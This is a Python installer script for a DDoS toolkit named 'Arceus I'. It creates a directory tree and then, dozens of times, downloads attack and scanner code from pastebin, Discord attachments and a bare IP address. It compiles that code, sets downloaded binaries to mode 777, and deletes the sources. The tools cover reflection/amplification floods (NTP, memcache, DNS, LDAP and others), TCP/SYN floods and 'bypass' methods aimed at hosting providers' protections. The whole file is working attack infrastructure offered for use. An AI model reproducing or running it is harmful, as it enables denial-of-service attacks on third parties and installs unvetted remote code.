# -*- coding: utf-8 -*-
# Developed By Georgia Cri / FlexingOnLamers
import subprocess, time

def arc(cmd):
	subprocess.call(cmd, shell=True)

#================================================#
# Colors
orange = "\x1b[38;5;202m"
pink = "\x1b[38;5;201m"
purple = "\x1b[38;5;93m"
#================================================#
TotalmethodsIPHM = "64"
#================================================#
# V1 Methods
ScannedMethods = ["ldap", "ntp", "tftp", "ssdp", "portmap", "chargen", "sentinel", "netbios", "mssql", "ts3"]
Extramethods = ["vse", "telnet", "tcp-abuse", "udp-abuse", "dominate"]
bypassmethods = ["ovhbypass", "cfbypass", "nfobypass", "bo4bypass"]
vipmethods = ["hun-fun", "ass-crk", "eft-pwr", "pmp-pmp", "zch-cri"]
extramethods = ["essyn", "csyn", "xsyn", "zsyn", "issyn"]
servermethods = ["winsyn", "winseqid", "yubina", "prowin"]
totalv1methods = "33"
#================================================#
# v1 Directories
#================================================#
# Scanned / reflection Based methods
#================================================#
reflection = "amp/methods/layer4/v1/reflection/"
bandwidth = "amp/methods/layer4/v1/bandwidth/"
ldap = "amp/methods/layer4/v1/reflection/ldap/"
ssdp = "amp/methods/layer4/v1/reflection/ssdp/"
ntp = "amp/methods/layer4/v1/reflection/ntp/"
tftp = "amp/methods/layer4/v1/reflection/tftp/"
portmap = "amp/methods/layer4/v1/reflection/portmap/"
sentinel = "amp/methods/layer4/v1/reflection/sentinel/"
chargen = "amp/methods/layer4/v1/reflection/chargen/"
mssql = "amp/methods/layer4/v1/reflection/mssql/"
ts3 = "amp/methods/layer4/v1/reflection/ts3/"
netbios = "amp/methods/layer4/v1/reflection/netbios/"
#================================================#
# Yubina Collection / bandwidth Based Methods
#================================================#
prowin = "amp/methods/layer4/v1/bandwidth/yubinacollection/"
yubina = "amp/methods/layer4/v1/bandwidth/yubinacollection/"
winseqid = "amp/methods/layer4/v1/bandwidth/yubinacollection/"
winsyn = "amp/methods/layer4/v1/bandwidth/yubinacollection/"
#================================================#
# Yubina Collection / bandwidth Based Methods
#================================================#
ovhbypass = "amp/methods/layer4/v1/bandwidth/bypasses/"
nfobypass = "amp/methods/layer4/v1/bandwidth/bypasses/"
cfbypass = "amp/methods/layer4/v1/bandwidth/bypasses/"
bo4bypass = "amp/methods/layer4/v1/bandwidth/bypasses/"
#================================================#
# Custom Methods / bandwidth / reflection based methods
#================================================#
hunfun = "amp/methods/layer4/v1/custom/hun-fun" 
pmppmp = "amp/methods/layer4/v1/custom/pmp-pmp"
zchcri = "amp/methods/layer4/v1/custom/zch-cri"
asscrk = "amp/methods/layer4/v1/custom/ass-crk"
eftpwr = "amp/methods/layer4/v1/custom/eft-pwr"
#================================================#
# Other methods / bandwidth Based methods
#================================================#
vse = "amp/methods/layer4/v1/bandwidth/other/"
telnet = "amp/methods/layer4/v1/bandwidth/other/"
dominate = "amp/methods/layer4/v1/bandwidth/other/"
udpabuse = "amp/methods/layer4/v1/bandwidth/other/"
tcpabuse = "amp/methods/layer4/v1/bandwidth/other/"
csyn = "amp/methods/layer4/v1/bandwidth/other/"
xsyn = "amp/methods/layer4/v1/bandwidth/other/"
zsyn = "amp/methods/layer4/v1/bandwidth/other/"
essyn = "amp/methods/layer4/v1/bandwidth/other/"
issyn = "amp/methods/layer4/v1/bandwidth/other/"
#================================================#
# v2 methods
#================================================#
ScannedMethodsII = ["dns", "mdns", "db2", "arceus", "echo", "snmp", "memcache", "rip", "reaper", "heartbeat"]
TCPCollection = ["tcp-psh", "tcp-rst", "tcp-fin", "tcp-xmas", "tcp-ack"]
ExtraMethodsIII = ["grenade", "zap", "rawudp", "bogus", "wizard"]
VIPMethodsII = ["msqdnm", "tfdnp", "lndp", "ardmsp"]
ExtraMethodsIV = ["udp_vse1", "udp_vse2", "ejunk", "xanax", "frag"]
totalv2methods = "29"
#================================================#
# v2 Directories
#================================================#
#================================================#
# Scanned / reflection Based methods
#================================================#
dns = "amp/methods/layer4/v2/reflection/dns/"
snmp = "amp/methods/layer4/v2/reflection/snmp/"
db2 = "amp/methods/layer4/v2/reflection/db2/"
echo = "amp/methods/layer4/v2/reflection/echo/"
mdns = "amp/methods/layer4/v2/reflection/mdns/"
memcache = "amp/methods/layer4/v2/reflection/memcache/"
rip = "amp/methods/layer4/v2/reflection/rip/"
reaper = "amp/methods/layer4/v2/reflection/reaper/"
heartbeat = "amp/methods/layer4/v2/reflection/heartbeat/"
arcmethod = "amp/methods/layer4/v2/reflection/arceus/"
wsd = "amp/methods/layer4/v2/reflection/wsd/"
ard = "amp/ethods/layer4/v2/reflection/ard/"
#================================================#
# Other methods / bandwidth based methods
#================================================#
zap = "amp/methods/layer4/v2/bandwidth/other/"
wizard = "amp/methods/layer4/v2/bandwidth/other/"
bogus = "amp/methods/layer4/v2/bandwidth/other/"
rawudp = "amp/methods/layer4/v2/bandwidth/other/"
udpvse1 = "amp/methods/layer4/v2/bandwidth/other/"
udpvse2 = "amp/methods/layer4/v2/bandwidth/other/"
grenade = "amp/methods/layer4/v2/bandwidth/other/"
xanax = "amp/methods/layer4/v2/bandwidth/other/"
frag = "amp/methods/layer4/v2/bandwidth/other/"
ejunk = "amp/methods/layer4/v2/bandwidth/other/"
#================================================#
# Layer 7 methods
#================================================#
omega = "amp/methods/layer7/v2/"
arme = "amp/methods/layer7/v2/"
#================================================#
# tcp-collection methods / bandwidth based methods
#================================================#
tcppsh = "amp/methods/layer4/v2/bandwidth/tcpcollection/"
tcpfin = "amp/methods/layer4/v2/bandwidth/tcpcollection/"
tcpxmas = "amp/methods/layer4/v2/bandwidth/tcpcollection/"
tcprst = "amp/methods/layer4/v2/bandwidth/tcpcollection/"
tcpack = "amp/methods/layer4/v2/bandwidth/tcpcollection/"
#================================================#
# V1 Directory Listings
#================================================#
# Methods that go into amp/methods/layer4/v1/bandwidth/yubinacollection/ directory
# prowin, yubina, winseqid, winsyn
#================================================#
# Methods that go into amp/methods/layer4/v1/bandwidth/bypasses/ Directory
# ovhbypass, nfobypass, bo4bypass
#================================================#
# Methods that go into amp/methods/layer7/v1/
# cfbypass
#================================================#
# Methods that go into  amp/methods/layer4/v1/bandwidth/extra/ folder
# vse, telnet, dominate, udp_abuse, tcp-abuse
#================================================#
# Methods that go into /custom/ directories
# amp/methods/layer4/v1/custom/hun-fun || amp/methods/layer4/custom/pmp-pmp 
# amp/methods/layer4/v1/custom/zch-cri || amp/methods/layer4/custom/ass-crk ||  amp/methods/layer4/custom/eft-pwr
#================================================#
# v2 Directory Listing
#================================================#
# methods that go into amp/methods/layer4/v2/reflection/
# dns, snmp, db2, echo, mdns, memcache, rip, reaper, heartbeat, arc-method
#================================================#
# Methods that go inside amp/methods/layer4/v2/bandwidth/other
# zap, wizard, bogus, rawudp, udp_vse1, udp_vse2, grenade, xanax, frag
#================================================#
# Methods that go into amp/methods/layer4/bandwidth/tcpcollection/ directory
# tcp-psh.c tcp-fin.c tcp-ack.c tcp-rst.c tcp-xmas.c
#================================================#
# Methods that go into amp/methods/layer7/v2/
# omega, arme 
#v1 Scripts
arc('rm -rf amp/')
#v1 attack scripts (raw file)
arc("rm -rf ldap ntp ts3 ssdp tftp portmap netbios sentinel chargen mssql")
#v1 attack scripts (.c files)
arc("rm -rf ldap.c ntp.c ts3.c ssdp.c tftp.c portmap.c netbios.c sentinel.c chargen.c mssql.c")
#v1 scanners (raw file)
arc("rm -rf ldapscan ntpscan ts3scan ssdpscan tftpscan portmapscan netbiosscan sentinelscan chargenscan mssqlscan")
#v1 scanners (.c file)
arc("rm -rf ldapscan.c ntpscan.c ts3scan.c ssdpscan.c tftpscan.c portmapscan.c netbiosscan.c sentinelscan.c chargenscan.c mssqlscan.c")
#v1 alt Attack Scripts
arc("rm -rf prowin yubina winseqid winsyn")
arc('rm -rf ovhbypass nfobypass bo4bypass CF_Bypass')
arc("rm -rf vse telnet dominate udp_abuse tcp_abuse")
arc("rm -rf vse.c telnet.c dominate.c")
arc("rm -rf csyn xsyn zsyn essyn.c issyn.c")
arc("rm -rf csyn.c xsyn.c zsyn.c")
#================================================#
#v2 Scripts
arc('rm -rf amp/')
#v2 attack scripts (raw file)
arc("rm -rf dns snmp db2 echo mdns memcache rip reaper heartbeat arc-method")
#v2 attack scripts (.c files)
arc("rm -rf dns.c snmp.c db2.c echo.c mdns.c memcache.c rip.c reaper.c heartbeat.c arc-method.c")
#v2 scanners (raw file)
arc("rm -rf dns snmp db2 echo mdns memcache rip reaper heartbeat arc-method")
#v2 Alt Attack Scripts
arc("rm -rf zap wizard bogus bogus rawudp udp_vse1 udp_vse2 grenade xanax frag arme omega")
arc("rm -rf tcp-psh tcp-rst tcp-fin tcp-xmas tcp-ack ejunk")
#================================================#
# Making Directories
arc('mkdir amp; cd amp; mkdir methods; cd; cd amp/methods/; mkdir layer4; mkdir layer7; cd; cd amp/methods/layer4/; mkdir v1; mkdir v2; cd; cd amp/methods/layer4/v1 && mkdir reflection custom bandwidth; cd; cd amp/methods/layer4/v2 && mkdir reflection bandwidth; cd; cd amp/methods/layer7/; mkdir v1 v2')
# v1 directory creation
arc('cd amp/methods/layer4/v1/reflection/ && mkdir ldap ntp ssdp tftp netbios ts3 portmap sentinel chargen mssql; cd')
arc('cd amp/methods/layer4/v1/bandwidth/ && mkdir yubinacollection bypasses other; cd')
arc('cd amp/methods/layer4/v1/custom/ && mkdir pmp-pmp hun-fun ass-crk eft-pwr zch-cri; cd')
# v2 Directory creation
arc('cd amp/methods/layer4/v2/reflection/ && mkdir dns snmp db2 echo mdns memcache rip reaper heartbeat arceus wsd ard; cd')
arc('cd amp/methods/layer4/v2/bandwidth/ && mkdir tcpcollection && mkdir other; cd')

print("\033[38;5;202mDownloading IP-Header Modification Files For Arceus I")
#==================================================
# ldap install
arc("cd "+ ldap +" && wget -q https://pastebin.com/raw/7HekXzBs -O ldap.c && gcc -o ldap ldap.c -pthread; cd; cd")
arc("cd "+ ldap +" && wget -q https://pastebin.com/raw/Yy7MrvmU -O ldapscan.c && gcc -o ldapscan ldapscan.c -pthread; cd; cd")
# ssdp install
arc("cd "+ ssdp +" && wget -q http://pastebin.com/raw/vpbXuKVA -O ssdp.c; gcc -o ssdp ssdp.c -pthread; cd; cd")
arc("cd "+ ssdp +" && wget -q http://pastebin.com/raw/7uNYKs4c -O ssdpscan.c; gcc -o ssdpscan ssdpscan.c -pthread; cd; cd")
# ntp install
arc("cd "+ ntp +" && wget -q http://pastebin.com/raw/PJeYk4Bc -O ntp.c; gcc -o ntp ntp.c -pthread; cd; cd")
arc("cd "+ ntp +" && wget -q http://pastebin.com/raw/XWFfm5hh -O ntpscan.c; gcc -o ntpscan ntpscan.c -pthread; cd; cd")
# chargen install
arc("cd "+ chargen +" && wget -q http://pastebin.com/raw/Kktvq2pz -O chargen.c; gcc -o chargen chargen.c -pthread; cd; cd")
arc("cd "+ chargen +" && wget -q http://pastebin.com/raw/FpeqRp6K -O chargenscan.c; gcc -o chargenscan chargenscan.c -pthread; cd; cd")
# sentinel install
arc("cd "+ sentinel +" && wget -q http://pastebin.com/raw/jmPdAPPM -O sentinel.c; gcc -o sentinel sentinel.c -pthread; cd; cd")
arc("cd "+ sentinel +" && wget -q http://pastebin.com/raw/gX0waM82 -O sentinelscan.c; gcc -o sentinelscan sentinelscan.c -pthread; cd; cd")
# netbios install
arc("cd "+ netbios +" && wget -q http://pastebin.com/raw/D0UFWXmU -O netbios.c; gcc -o netbios netbios.c -pthread; cd; cd")
arc("cd "+ netbios +" && wget -q http://pastebin.com/raw/V6jTyjbi -O netbiosscan.c; gcc -o netbiosscan netbiosscan.c -pthread; cd; cd")
# mssql install
arc("cd "+ mssql +" && wget -q http://pastebin.com/raw/RsYN9wYs -O mssql.c; gcc -o mssql mssql.c -pthread; cd")
arc("cd "+ mssql +" && wget -q http://pastebin.com/raw/3MT59SGE -O mssqlscan.c; gcc -o mssqlscan mssqlscan.c -pthread; cd")
# ts3 install
arc("cd "+ ts3 +" && wget -q http://pastebin.com/raw/LAb0nSbh -O ts3.c; gcc -o ts3 ts3.c -pthread; cd")
arc("cd "+ ts3 +" && wget -q http://pastebin.com/raw/bgraxVGt -O ts3scan.c; gcc -o ts3scan ts3scan.c -pthread; cd")
# portmap install
arc("cd "+ portmap +" && wget -q http://pastebin.com/raw/PNDMd2CF -O portmap.c; gcc -o portmap portmap.c -pthread; cd")
arc("cd "+ portmap +" && wget -q http://pastebin.com/raw/LH6yB0Yt -O portmapscan.c; gcc -o portmapscan portmapscan.c -pthread; cd")
# tftp install
arc("cd "+ tftp +" && wget -q http://pastebin.com/raw/De6amhpb -O tftp.c; gcc -o tftp tftp.c -pthread; cd")
arc("cd "+ tftp +" && wget -q http://pastebin.com/raw/f1TkRk0x -O tftpscan.c; gcc tftpscan.c -pthread -lpcap -o tftpscan; cd")
#==================================================
# Prowin install
arc("cd "+ prowin +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/yubina_collection/Files/prowin -O prowin; chmod 777 prowin; cd")
# yubina install
arc("cd "+ yubina +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/yubina_collection/Files/yubina -O yubina; chmod 777 yubina; cd")
# winseqid install
arc("cd "+ winseqid +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/yubina_collection/Files/winseqid -O winseqid; chmod 777 winseqid; cd")
# winsyn install 
arc("cd "+ winsyn +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/yubina_collection/Files/winsyn -O winsyn; chmod 777 winsyn; cd")
#==================================================
#Zachs Methods I:
#pmp-pmp install
arc("cd "+ pmppmp +" && wget -q https://cdn.discordapp.com/attachments/564005410210578458/582219421687480340/pmp-pmp.c -O pmp-pmp.c && gcc -o pmp-pmp pmp-pmp.c -pthread; cd")
arc("cd "+ pmppmp +" && wget -q https://cdn.discordapp.com/attachments/564005410210578458/582240960205946953/pmp-pmp-scan.c -O pmp-pmpscan.c && gcc -o pmp-pmpscan pmp-pmpscan.c -pthread; cd")
# HUN-FUN Install
arc("cd "+ hunfun +" && wget -q https://cdn.discordapp.com/attachments/564005410210578458/582238690806333456/hun-fun.c -O hun-fun.c && gcc -o hun-fun hun-fun.c -pthread; cd")
arc("cd "+ hunfun +" && wget -q https://cdn.discordapp.com/attachments/564005410210578458/582219209010839562/hun-fun-scan.c -O hun-funscan.c && gcc -o hun-funscan hun-funscan.c -pthread; cd") 
#==================================================
#Bypass Methods I:
arc("cd "+ ovhbypass +" && wget -q https://cdn.discordapp.com/attachments/564177458631409694/574420527125364757/xDoS -O ovhbypass; chmod 777 ovhbypass; cd")
arc("cd "+ nfobypass +" && wget -q https://cdn.discordapp.com/attachments/545653871427715093/574418889484664852/RAWstd -O nfobypass; chmod 777 nfobypass; cd")
arc("cd "+ cfbypass +" && wget -q https://cdn.discordapp.com/attachments/564177458631409694/575879023440166932/CF_bypass.php -O CF_Bypass.php; cd")
arc("cd "+ bo4bypass +" && wget -q https://cdn.discordapp.com/attachments/570046106474643486/575885559688462336/xts3 -O bo4bypass; chmod 777 bo4bypass; cd")
#==================================================
#Extra Methods I:
# vse install
arc("cd "+ vse +" && wget -q http://pastebin.com/raw/9v26VXgV -O vse.c; gcc -o vse vse.c -pthread; cd")
# telnet install
arc("cd "+ telnet +" && wget -q http://pastebin.com/raw/y6hAsCMv -O telnet.c; gcc -o telnet telnet.c -pthread; cd")
# dominate install
arc("cd "+ dominate +" && wget -q http://pastebin.com/raw/dR2pEeiq -O dominate.c; gcc -o dominate dominate.c -pthread; cd")
# tcp-abuse install
arc("cd "+ tcpabuse +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/Other/tcp_abuse -O tcp_abuse")
# udpabuse install
arc("cd "+ udpabuse +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/Other/udp_abuse -O udp_abuse")
#==================================================
#Extra Methods II:
# zsyn install
arc("cd "+ zsyn +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/zsyn.c -O zsyn.c; gcc -o zsyn zsyn.c -pthread; cd")
# xsyn install
arc("cd "+ xsyn +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/xsyn.c -O xsyn.c; gcc -o xsyn xsyn.c -pthread; cd")
# csyn install
arc("cd "+ csyn +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/csyn.c -O csyn.c; gcc -o csyn csyn.c -pthread; cd")
# essyn install
arc("cd "+ essyn +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/essyn.c -O essyn.c; chmod 777 essyn.c; cd")
# issyn install
arc("cd "+ issyn +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/syn_collection/issyn.c -O issyn.c; chmod 777 issyn.c; cd")
#==================================================
#Scannable Methods II:
# dns install
arc("cd "+ dns +" && wget -q http://pastebin.com/raw/JV9nCf6U -O dns.c && gcc -o dns dns.c -pthread; cd")
arc("cd "+ dns +" && wget -q http://pastebin.com/raw/ASH2DYqq -O dnsscan.c && gcc -o dnsscan dnsscan.c -pthread; cd")
# snmp install
arc("cd "+ snmp +" && wget -q http://pastebin.com/raw/7LXZXPWf -O snmp.c && gcc -o snmp snmp.c -pthread; cd")
arc("cd "+ snmp +" && wget -q http://pastebin.com/raw/EtCTaqG1 -O snmpscan.c && gcc -o snmpscan snmpscan.c -pthread; cd")
# db2 install
arc("cd "+ db2 +" && wget -q http://pastebin.com/raw/PNDMd2CF -O db2.c && gcc -o db2 db2.c -pthread; cd")
arc("cd "+ db2 +" && wget -q http://pastebin.com/raw/Fuza6KEM -O db2scan.c && gcc db2scan.c -pthread -lpcap -o db2scan")
# echo install
arc("cd "+ echo +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/echo/echo.c -O echo.c && gcc -o echo echo.c -pthread; cd")
arc("cd "+ echo +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/echo/echoscan.c -O echoscan.c && gcc echoscan.c -pthread -lpcap -o echoscan")
# mdns install
arc("cd "+ mdns +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/mdns/mdns.c -O mdns.c && gcc -o mdns mdns.c -pthread; cd")
arc("cd "+ mdns +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/mdns/mdnsscan.c -O mdnsscan.c && gcc -o mdnsscan mdnsscan.c -pthread; cd")
# memcache install
arc("cd "+ memcache +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/memcache/memcache -O memcache && chmod 777 memcache; cd")
arc("cd "+ memcache +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/memcache/memcachescan -O memcachescan && chmod 777 memcachescan; cd")
# rip install
arc("cd "+ rip +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/rip/rip.c -O rip.c && gcc -o rip rip.c -pthread; cd")
arc("cd "+ rip +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/rip/ripscan.c -O ripscan.c && gcc -o ripscan ripscan.c -pthread; cd")
# Reaper Install
arc("cd "+ reaper +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/reaper/reaper.c -O reaper.c && gcc -o reaper reaper.c.c -pthread; cd")
arc("cd "+ reaper +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/reaper/reaperscan.c -O reaperscan.c && gcc -o reaperscan reaperscan.c -pthread; cd")
# Heartbeat Install
arc("cd "+ heartbeat +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/heartbeat/heartbeat.c -O heartbeat.c && gcc -o heartbeat heartbeat.c -pthread; cd")
arc("cd "+ heartbeat +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/heartbeat/heartbeatscan.c -O heartbeatscan.c && gcc -o heartbeatscan heartbeatscan.c -pthread; cd")
# WSD Install
arc("cd "+ wsd +" && wget -q https://cdn.discordapp.com/attachments/583725996931416097/586427368386592815/wsd.c -o wsd.c; gcc -o wsd wsd.c -pthread; cd")
arc("cd "+ wsd +" && wget -q https://cdn.discordapp.com/attachments/583725996931416097/586427368697233409/wsdscan.c -O wsdscan.c; gcc -o wsdscan wsdscan.c -pthread; cd")
# ARD Install
arc("cd "+ ard +" && wget -q https://cdn.discordapp.com/attachments/583725996931416097/586747101384540162/ARD-Attack.c -O ard.c; gcc -o ard ard.c -pthread")
#==================================================
#Extra Methods III: 
# Grenade Install
arc("cd "+ grenade +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Precompiled/grenade -O grenade && chmod 777 grenade; cd")
# zap Install
arc("cd "+ zap +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/Other_Collection/zap.c -O zap.c && gcc -o zap zap.c -pthread; cd")
# wizard Install
arc("cd "+ wizard +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/Other_Collection/wizard.c -O wizard.c && gcc -o wizard wizard.c -pthread; cd")
# bogus Install
arc("cd "+ bogus +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Sources/bogus.c -O bogus.c && gcc -o bogus bogus.c -pthread; cd")
# rawdup Install
arc("cd "+ rawudp +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Raw_Collection/rawudp.c -O rawudp.c && gcc -o rawudp rawudp.c -pthread; cd")
# tcp-psh Install
arc("cd "+ tcppsh +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/tcp_collection/tcp-psh.c -O tcp-psh.c && chmod 777 tcp-psh.c; cd")
# tcp-rst Install
arc("cd "+ tcprst +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/tcp_collection/tcp-rst.c -O tcp-rst.c && chmod 777 tcp-rst.c; cd")
#tcp fin Install
arc("cd "+ tcpfin +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/tcp_collection/tcp-fin.c -O tcp-fin.c && chmod 777 tcp-fin.c; cd")
# tcp-ack Install
arc("cd "+ tcpack +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/tcp_collection/tcp-ack.c -O tcp-ack.c && chmod 777 tcp-ack.c; cd")
# tcp-xmas Install
arc("cd "+ tcpxmas +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/tcp_collection/tcp-xmas.c -O tcp-xmas.c && chmod 777 tcp-xmas.c; cd")
# udp_vse2 Install
arc("cd "+ udpvse2 +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Raw_Collection/UDP_VSE2.c -O UDP_VSE2.c && gcc -o UDP_VSE2 UDP_VSE2.c -pthread; cd")
# udp_vse1 install 
arc("cd "+ udpvse1 +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Raw_Collection/UDP_VSE.c -O UDP_VSE.c && gcc -o UDP_VSE UDP_VSE.c -pthread; cd")
# ejunk Install
arc("cd "+ ejunk +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Precompiled/ejunk -O ejunk && chmod 777 ejunk; cd")
# xanax Install
arc("cd "+ xanax +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Precompiled/xanax -O xanax && chmod 777 xanax; cd")
# frag install 
arc("cd "+ frag +" && wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Sources/frag.c -O frag.c && gcc -o frag frag.c -pthread; cd")
# omega install
arc("cd "+ omega +" && wget -q https://cdn.discordapp.com/attachments/564177458631409694/580871213316964373/bypass.js -O omega.js")
# arme install 
arc("cd "+ arme +" && wget -q http://98.143.148.177/Archive/reprobate/layer7/Sources/arme.c -O arme.c && gcc -o arme arme.c -pthread")
#==================================================
# Now its time to delete all of the raw .c files
# files to NOT delete < essyn.c, issyn.c, tcp-psh.c, tcp-ack.c, tcp-fin.c, tcp-xmas.c, tcp-rst.c
# scannable methods v1
arc("cd "+ ldap +" && rm -rf ldap.c ldapscan.c")
arc("cd "+ ssdp +" && rm -rf ssdp.c ssdpscan.c")
arc("cd "+ ntp +" && rm -rf ntp.c ntpscan.c")
arc("cd "+ tftp +" && rm -rf tftp.c tftpscan.c")
arc("cd "+ portmap +" && rm -rf portmap.c portmapscan.c")
arc("cd "+ sentinel +" && rm -rf sentinel.c sentinelscan.c")
arc("cd "+ chargen +" && rm -rf chargen.c chargenscan.c")
arc("cd "+ mssql +" && rm -rf mssql.c mssqlscan.c")
arc("cd "+ ts3 +" && rm -rf ts3.c ts3scan.c")
arc("cd "+ netbios +" && rm -rf netbios.c netbiosscan.c")
# custom methods v1
arc("cd "+ hunfun +" && rm -rf hun-fun.c hun-funscan.c")
arc("cd "+ pmppmp +" && rm -rf pmp-pmp.c pmp-pmpscan.c")
arc("cd "+ zchcri +" && rm -rf zch-cri.c zch-criscan.c")
arc("cd "+ asscrk +" && rm -rf ass-crk.c ass-crkscan.c")
arc("cd "+ eftpwr +" && rm -rf eft-pwr.c eft-pwrscan.c")
# other methods v1
arc("cd "+ vse +" && rm -rf vse.c")
arc("cd "+ telnet +" && rm -rf telnet.c")
arc("cd "+ dominate +" && rm -rf dominate.c")
arc("cd "+ csyn +" && rm -rf csyn.c")
arc("cd "+ xsyn +" && rm -rf xsyn.c")
arc("cd "+ zsyn +" && rm -rf zsyn.c")
# scannable / reflection methods v2
arc("cd "+ dns +" && rm -rf dns.c dnsscan.c")
arc("cd "+ snmp +" && rm -rf snmp.c snmpscan.c")
arc("cd "+ db2 +" && rm -rf db2.c db2scan.c")
arc("cd "+ echo +" && rm -rf echo.c echoscan.c")
arc("cd "+ mdns +" && rm -rf mdns.c mdnsscan.c")
arc("cd "+ rip +" && rm -rf rip.c ripscan.c")
arc("cd "+ reaper +" && rm -rf reaper.c reaperscan.c")
arc("cd "+ heartbeat +" && rm -rf heartbeat.c heartbeatscan.c")
arc("cd "+ arcmethod +" && rm -rf arc.c arcscan.c")
arc("cd "+ wsd +" && rm -rf wsd.c wsdscan.c")
arc("cd "+ ard +" && rm -rf ard.c")
# other methods v2
arc("cd "+ zap +" && rm -rf zap.c")
arc("cd "+ wizard +" && rm -rf wizard.c")
arc("cd "+ bogus +" && rm -rf bogus.c")
arc("cd "+ rawudp +" && rm -rf rawudp.c")
arc("cd "+ udpvse2 +" && rm -rf UDP_VSE2.c")
arc("cd "+ udpvse1 +" && rm -rf UDP_VSE.c")
arc("cd "+ frag +" && rm -rf frag.c")
arc("cd "+ arme +" && rm -rf arme.c")
arc('clear')
print(""+ pink +"╔═══════════════════════╗╔════════════════════╗╔════════════════════╗╔════════════════════╗")
print(""+ pink +"║ "+ orange +"Downloaded all methods"+ pink +"║║ "+ orange +"vse "+ pink +"{"+ purple +"IPHM"+ pink +"}         ║║ "+ orange +"dns "+ pink +"{"+ purple +"IPHM"+ pink +"}         ║║ "+ orange +"Arceus I "+ pink +"- "+ orange +"Beta 10 "+ pink +"║")
print(""+ pink +"╠═══════════════════════╣║ "+ orange +"telnet "+ pink +"{"+ purple +"IPHM"+ pink +"}      ║║ "+ orange +"snmp "+ pink +"{"+ purple +"IPHM"+ pink +"}        ║║ "+ orange +"IPHM/Amplification "+ pink +"║")
print(""+ pink +"║ "+ orange +"ldap "+ pink +"{"+ purple +"IPHM"+ pink +"}           ║║ "+ orange +"tcpabuse "+ pink +"{"+ purple +"IPHM"+ pink +"}    ║║ "+ orange +"db2 "+ pink +"{"+ purple +"IPHM"+ pink +"}         ║║ "+ orange +"Installation Script"+ pink +"║")
print(""+ pink +"║ "+ orange +"ntp "+ pink +"{"+ purple +"IPHM"+ pink +"}            ║║ "+ orange +"udpabuse "+ pink +"{"+ purple +"IPHM"+ pink +"}    ║║ "+ orange +"echo "+ pink +"{"+ purple +"IPHM"+ pink +"}        ║║ "+ orange +"  Developer"+ pink +": "+ purple +"Cri   "+ pink +"║")
print(""+ pink +"║ "+ orange +"tftp "+ pink +"{"+ purple +"IPHM"+ pink +"}           ║║ "+ orange +"dominate "+ pink +"{"+ purple +"IPHM"+ pink +"}    ║║ "+ orange +"mdns "+ pink +"{"+ purple +"IPHM"+ pink +"}        ║╚════════════════════╝")
print(""+ pink +"║ "+ orange +"ssdp "+ pink +"{"+ purple +"IPHM"+ pink +"}           ║║ "+ orange +"winsyn "+ pink +"{"+ purple +"IPHM"+ pink +"}      ║║ "+ orange +"memcache "+ pink +"{"+ purple +"IPHM"+ pink +"}    ║")
print(""+ pink +"║ "+ orange +"portmap "+ pink +"{"+ purple +"IPHM"+ pink +"}        ║║ "+ orange +"winseqid "+ pink +"{"+ purple +"IPHM"+ pink +"}    ║║ "+ orange +"rip "+ pink +"{"+ purple +"IPHM"+ pink +"}         ║")
print(""+ pink +"║ "+ orange +"chargen "+ pink +"{"+ purple +"IPHM"+ pink +"}        ║║ "+ orange +"yubina "+ pink +"{"+ purple +"IPHM"+ pink +"}      ║║ "+ orange +"reaper "+ pink +"{"+ purple +"IPHM"+ pink +"}      ║╔════════════════════╗")
print(""+ pink +"║ "+ orange +"sentinel "+ pink +"{"+ purple +"IPHM"+ pink +"}       ║║ "+ orange +"prowin "+ pink +"{"+ purple +"IPHM"+ pink +"}      ║║ "+ orange +"heartbeat "+ pink +"{"+ purple +"IPHM"+ pink +"}   ║║ "+ orange +"xanax "+ pink +"{"+ purple +"IPHM"+ pink +"}       "+ pink +"║")
print(""+ pink +"║ "+ orange +"netbios "+ pink +"{"+ purple +"IPHM"+ pink +"}        ║║ "+ orange +"essyn "+ pink +"{"+ purple +"IPHM"+ pink +"}       ║║ "+ orange +"grenade "+ pink +"{"+ purple +"IPHM"+ pink +"}     ║║ "+ orange +"frag "+ pink +"{"+ purple +"IPHM"+ pink +"}        "+ pink +"║")
